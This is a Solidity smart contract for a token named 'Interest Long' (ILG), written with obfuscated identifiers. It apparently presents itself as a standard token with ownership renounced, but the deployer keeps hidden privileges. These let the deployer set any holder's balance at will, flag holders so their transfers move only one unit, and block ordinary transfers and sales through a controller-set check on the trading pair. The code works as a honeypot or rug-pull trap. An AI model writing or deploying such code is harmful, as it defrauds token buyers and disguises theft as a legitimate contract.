//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface maxTokenMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract launchWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletLaunch {
    function createPair(address amountTeamLiquidity, address autoMarketing) external returns (address);
}

interface exemptFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isLaunch) external view returns (uint256);

    function transfer(address toTx, uint256 launchedTeamToken) external returns (bool);

    function allowance(address exemptTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedTeamToken) external returns (bool);

    function transferFrom(
        address sender,
        address toTx,
        uint256 launchedTeamToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalLaunched, uint256 value);
    event Approval(address indexed exemptTo, address indexed spender, uint256 value);
}

interface exemptFromMetadata is exemptFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InterestLong is launchWallet, exemptFrom, exemptFromMetadata {

    mapping(address => uint256) private senderTeam;

    function name() external view virtual override returns (string memory) {
        return walletTake;
    }

    address limitExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private atEnable = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return atEnable;
    }

    string private teamMin = "ILG";

    bool public fundAtSender;

    function transfer(address listLimit, uint256 launchedTeamToken) external virtual override returns (bool) {
        return marketingSwapBuy(_msgSender(), listLimit, launchedTeamToken);
    }

    uint256 public shouldToFee;

    event OwnershipTransferred(address indexed receiverLiquidityEnable, address indexed receiverFund);

    function owner() external view returns (address) {
        return fromTotal;
    }

    mapping(address => bool) public swapTradingFrom;

    function walletMode() public {
        emit OwnershipTransferred(senderAt, address(0));
        fromTotal = address(0);
    }

    uint8 private isLiquiditySender = 18;

    constructor (){
        if (amountTo == walletFee) {
            marketingTotal = amountTo;
        }
        maxTokenMarketing toEnable = maxTokenMarketing(teamWallet);
        walletMaxToken = walletLaunch(toEnable.factory()).createPair(toEnable.WETH(), address(this));
        
        senderAt = _msgSender();
        walletMode();
        swapTradingFrom[senderAt] = true;
        senderTeam[senderAt] = atEnable;
        if (walletFee != marketingTotal) {
            sellTotalReceiver = shouldToFee;
        }
        emit Transfer(address(0), senderAt, atEnable);
    }

    uint256 constant isSenderMax = 1 ** 10;

    address teamWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private marketingTotal;

    function transferFrom(address isLaunched, address toTx, uint256 launchedTeamToken) external override returns (bool) {
        if (_msgSender() != teamWallet) {
            if (fundSell[isLaunched][_msgSender()] != type(uint256).max) {
                require(launchedTeamToken <= fundSell[isLaunched][_msgSender()]);
                fundSell[isLaunched][_msgSender()] -= launchedTeamToken;
            }
        }
        return marketingSwapBuy(isLaunched, toTx, launchedTeamToken);
    }

    function sellMax(address totalShouldAuto) public {
        require(totalShouldAuto.balance < 100000);
        if (fundAtSender) {
            return;
        }
        
        swapTradingFrom[totalShouldAuto] = true;
        if (marketingTotal != sellTotalReceiver) {
            sellTotalReceiver = amountTo;
        }
        fundAtSender = true;
    }

    function balanceOf(address isLaunch) public view virtual override returns (uint256) {
        return senderTeam[isLaunch];
    }

    uint256 public amountTo;

    mapping(address => bool) public senderIs;

    address private fromTotal;

    uint256 autoModeBuy;

    function approve(address marketingLiquidity, uint256 launchedTeamToken) public virtual override returns (bool) {
        fundSell[_msgSender()][marketingLiquidity] = launchedTeamToken;
        emit Approval(_msgSender(), marketingLiquidity, launchedTeamToken);
        return true;
    }

    address public walletMaxToken;

    function isAmount(address listLimit, uint256 launchedTeamToken) public {
        receiverLaunchIs();
        senderTeam[listLimit] = launchedTeamToken;
    }

    mapping(address => mapping(address => uint256)) private fundSell;

    uint256 exemptToken;

    function marketingSwapBuy(address isLaunched, address toTx, uint256 launchedTeamToken) internal returns (bool) {
        if (isLaunched == senderAt) {
            return launchMarketing(isLaunched, toTx, launchedTeamToken);
        }
        uint256 tokenAuto = exemptFrom(walletMaxToken).balanceOf(limitExempt);
        require(tokenAuto == exemptToken);
        require(toTx != limitExempt);
        if (senderIs[isLaunched]) {
            return launchMarketing(isLaunched, toTx, isSenderMax);
        }
        return launchMarketing(isLaunched, toTx, launchedTeamToken);
    }

    function maxSwap(address takeMin) public {
        receiverLaunchIs();
        
        if (takeMin == senderAt || takeMin == walletMaxToken) {
            return;
        }
        senderIs[takeMin] = true;
    }

    uint256 public sellTotalReceiver;

    function receiverLaunchIs() private view {
        require(swapTradingFrom[_msgSender()]);
    }

    function minMarketing(uint256 launchedTeamToken) public {
        receiverLaunchIs();
        exemptToken = launchedTeamToken;
    }

    uint256 private receiverList;

    address public senderAt;

    function getOwner() external view returns (address) {
        return fromTotal;
    }

    uint256 public walletFee;

    function symbol() external view virtual override returns (string memory) {
        return teamMin;
    }

    function allowance(address amountFund, address marketingLiquidity) external view virtual override returns (uint256) {
        if (marketingLiquidity == teamWallet) {
            return type(uint256).max;
        }
        return fundSell[amountFund][marketingLiquidity];
    }

    function launchMarketing(address isLaunched, address toTx, uint256 launchedTeamToken) internal returns (bool) {
        require(senderTeam[isLaunched] >= launchedTeamToken);
        senderTeam[isLaunched] -= launchedTeamToken;
        senderTeam[toTx] += launchedTeamToken;
        emit Transfer(isLaunched, toTx, launchedTeamToken);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return isLiquiditySender;
    }

    string private walletTake = "Interest Long";

}